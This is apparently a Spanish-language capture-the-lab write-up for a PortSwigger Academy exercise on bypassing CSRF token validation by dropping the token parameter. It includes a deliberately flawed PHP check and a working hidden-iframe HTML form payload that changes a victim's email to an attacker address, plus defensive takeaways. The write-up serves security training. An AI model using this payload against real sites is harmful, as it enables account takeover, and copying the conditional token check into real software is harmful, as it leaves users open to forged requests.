# PortSwigger Lab: CSRF where token validation depends on token being present

![PortSwigger](https://img.shields.io/badge/Plataforma-PortSwigger%20Academy-blue)
![Dificultad](https://img.shields.io/badge/Dificultad-F%C3%A1cil-yellow)
![Tipo](https://img.shields.io/badge/Tipo-CSRF%20Bypass-red)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Writeup del laboratorio de PortSwigger sobre CSRF con validación de token condicional.

## Técnicas utilizadas

- CSRF (Cross-Site Request Forgery)
- Token validation bypass
- Parameter removal
- Conditional validation exploitation
- Burp Suite interception

## Flujo resumido

```
Capturar petición con token CSRF
→ Modificar token = Falla (validación activa)
→ Eliminar parámetro csrf = Éxito (validación omitida)
→ Crear payload sin token
→ Desplegar en exploit server
→ Enviar a víctima
→ Email cambiado
```

## Vulnerabilidad clave

El servidor valida el token CSRF **solo si el parámetro está presente**. Si se elimina el parámetro `csrf` completamente, la validación se omite y la petición es aceptada.

Lógica defectuosa:
```php
// INCORRECTO
if (isset($_POST['csrf']) && !validate_csrf_token($_POST['csrf'])) {
    die("Invalid token");
}
// Si csrf no existe, la función retorna true implícitamente
```

## Payload

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<form method="POST" 
      action="https://target.com/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value="attacker@attacker.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

**Nota:** El payload NO incluye el parámetro `csrf` — se envía solo `email`.

## Comparación con Lab 1

| Lab 1 (No defenses) | Lab 2 (Token condicional) |
|-------------------|--------------------------|
| Sin token CSRF | Con token CSRF |
| Validación inexistente | Validación condicional |
| Bypass directo | Requiere eliminar parámetro |
| Más obvio | Parece más seguro pero no lo es |

## Puntos clave

- La validación condicional es peor que no tener validación — crea falsa sensación de seguridad
- Un bypass simple: eliminar el parámetro
- El servidor debe validar SIEMPRE, no solo si el parámetro existe
- SameSite Cookie sería defensa adicional

## Referencias

- [PortSwigger — CSRF token validation bypass](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [OWASP — CSRF](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger Academy](https://portswigger.net/web-security/lab)
